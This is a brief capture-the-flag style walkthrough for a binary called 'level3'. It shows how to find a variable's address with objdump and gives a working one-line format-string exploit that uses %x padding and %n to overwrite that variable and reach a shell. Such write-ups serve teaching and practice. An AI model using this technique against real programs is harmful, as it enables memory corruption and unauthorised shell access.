Same as the last level, we decompile `objdump -d level3` to get `m` address :
We find a printf and a system


objdump -t level3 for see adress of <m>

(python -c "print '\x8c\x98\x04\x08%x%x%x' + 'A' * 41 + '%n'" ; cat) | ./level3

                    Address of <m> + PADDING + %n for extract length into <m>